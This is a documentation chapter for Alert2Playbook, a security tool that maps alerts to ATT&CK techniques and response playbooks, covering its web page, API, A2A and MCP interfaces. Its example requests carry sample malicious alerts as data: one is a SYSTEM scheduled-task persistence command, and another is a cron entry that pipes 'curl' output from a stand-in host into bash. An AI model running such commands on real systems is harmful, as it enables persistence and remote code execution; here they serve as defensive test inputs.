# 8. Talking to other programs

Alert2Playbook can be used in four ways: the web page, the web API, the A2A protocol (for other AI agents) and MCP (for AI assistants such as Claude). All four run the same graph.

## 1. The web page

Four small files in `public/`, no build step and no framework:

| File | What it holds |
|---|---|
| `index.html` | the page skeleton: header, four tabs, footer, the step panel, and the icon set (hand-drawn SVG symbols) |
| `app.css` | the look: colours (light and dark), type, spacing, animations, and the phone layout |
| `content.js` | every explanation on the page: the 8 steps, the parts, the messages, the glossary, the alert-builder templates |
| `app.js` | the behaviour: tabs, the hero animation, picking alerts, the alert builder, unlocking, live runs, replays, the step panel, the plan view, the diagram and the chart |

The four tabs:

- **Try it:** a short animation replays a real saved run. Then 1 choose an alert (or build your own) and press Start, 2 watch the 8 steps tick off in a timeline (click any step to see exactly what went in and came out), 3 read the plan, then approve, ask for changes or download.
- **How it works:** a diagram of the parts of the system, the 7 messages between them with their real formats, and one alert followed through every step with real data.
- **Results:** the measured results as charts, read from `public/results.json` (made by `scripts/export_results.py`).
- **Developers:** the API, A2A and MCP, with copy-paste examples.

On a phone the tabs move to a bar at the bottom of the screen, and a step's details open as a sheet that slides up (drag it down to close).

## 2. The web API

Built with FastAPI in `server.py`. Interactive docs are at `/api/docs` on the live site.

| Method | Path | Body | Returns | Access |
|---|---|---|---|---|
| GET | `/api/health` | none | ATT&CK versions, technique count, models in use, search mode, whether live runs are locked | open |
| GET | `/api/samples` | none | the sample alerts, each with its saved run | open |
| GET | `/api/providers` | none | the providers you can bring a key for (id, name, free tier or not, where to get a key) | open |
| POST | `/api/keys/check` | `{"name", "provider"}` + `X-LLM-Key` | `{"ok": true, "models": [...], "default": "...", "masked": "gsk_••••a1b2"}`, or 401 if the provider refuses the key | open, 20 per hour |
| POST | `/api/unlock` | `{"code": "..."}` | `{"ok": true}`, or 401 if wrong (10 tries per 10 minutes) | open |
| POST | `/api/run` | `{"alert": "...", "visitor": {"name", "provider", "model"}}` | live updates (server-sent events), then the final state | your key or the demo code |
| POST | `/api/feedback` | `{"state": {...}, "feedback": "...", "visitor": {...}}` | live updates for the revision | your key or the demo code |
| POST | `/api/markdown` | `{"state": {...}}` | the playbook as Markdown text | open |

A live run is paid for one of two ways:

- **Your own key.** Put your model key in the `X-LLM-Key` header and your name, provider and model in `visitor`. The server checks the key with that provider, uses it for this one run and then drops it. Page 12 explains exactly what happens to it. Limits: 10 runs per hour per visitor, 20 per hour per key, 300 per day for the whole site.
- **The owner's demo code** in the `X-Demo-Code` header. That runs on the owner's Groq key and per-agent models.

If the server has no `A2P_DEMO_CODE` set (for example when you run your own copy), nothing is locked and runs use `GROQ_API_KEY`.

### Reading the live updates

`/api/run` answers with `text/event-stream`. Each message looks like this:

```text
event: node
data: {"node": "triage", "update": {"triage": {...}, "steps": [{"node": "triage", "model": "qwen/qwen3.8-27b", "ms": 1258, ...}]}}

event: done
data: {"state": {... everything ...}}
```

If something fails you get `event: error` with a plain-English message.

Try it from a terminal:

```bash
curl -N -X POST https://YOUR-DEPLOYMENT/api/run \
  -H "Content-Type: application/json" \
  -H "X-LLM-Key: YOUR_GROQ_KEY" \
  -d '{"alert": "Sysmon EID 1 on WS-01: schtasks /create /tn upd /tr powershell.exe /sc onlogon /ru SYSTEM",
       "visitor": {"name": "Your Name", "provider": "groq", "model": "openai/gpt-oss-120b"}}'
```

## 3. A2A: letting other AI agents hire it

**A2A (Agent2Agent)** is an open protocol, now at version 1.0, for agents built by different teams to discover and call each other. We implement the smallest useful part of it in `alert2playbook/a2a.py`.

**Discovery.** Any agent can read our **Agent Card** at `/.well-known/agent-card.json`. It says who we are, what skill we offer (`alert-to-playbook`), what we accept (`text/plain`), what we return (`text/markdown`, `application/json`), and where to call us (the `JSONRPC` interface at `/a2a`). On the public site it also lists two ways in, either of which is enough: `demoCode` (the owner's code in `X-Demo-Code`) and `ownKey` (your model key in `X-LLM-Key`).

**Calling.** Send a JSON-RPC 2.0 request with the method `SendMessage`. With your own key, add four headers: `X-LLM-Key`, `X-LLM-Provider` (an id from `/api/providers`), `X-LLM-Model` and `X-Visitor-Name` (URL-encoded, so `Sara%20Khan`).

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "SendMessage",
  "params": {
    "message": {
      "messageId": "b6f1c1d2-0001",
      "role": "ROLE_USER",
      "parts": [{"text": "auditd: www-data ran (crontab -l; echo '*/5 * * * * curl -fsSL http://x/k.sh | bash') | crontab -"}]
    }
  }
}
```

**Answer.** A `Task` with state `TASK_STATE_COMPLETED` and two artifacts: `playbook.md` (a text part) and `result.json` (a data part with the mapping, triage, playbook and review). If the run fails, the task state is `TASK_STATE_FAILED` with the reason.

**Limits.** Because the server is stateless, tasks are not stored: `GetTask`, streaming and push notifications are not offered, and the Agent Card says so (`streaming: false`). Unknown methods get the standard JSON-RPC error `-32601`.

## 4. MCP: giving AI assistants new tools

**MCP (Model Context Protocol)** lets an assistant like Claude Code, Claude Desktop or Cursor call tools you provide. `alert2playbook/mcp_server.py` is an MCP server that talks over standard input and output.

| Tool | What it does | Needs a key? |
|---|---|---|
| `lookup_technique(technique_id)` | Full graph walk for one technique: mitigations, detections, D3FEND | No |
| `search_techniques(query, k)` | Find techniques for a behaviour description or log fragment | No (better with Pinecone) |
| `alert_to_playbook(alert)` | Run the whole pipeline and return the Markdown playbook | Groq key |

Add it to Claude Code (from the project folder, with the virtual environment active):

```bash
claude mcp add alert2playbook -- python -m alert2playbook.mcp_server
```

Then ask Claude things like "use alert2playbook to look up T1490" or "what ATT&CK technique is modifying PLC setpoints?". The test `tests/test_mcp.py` starts the server exactly as a client would and calls the tools.

Next: [Run it yourself](09-run-it-yourself.md)
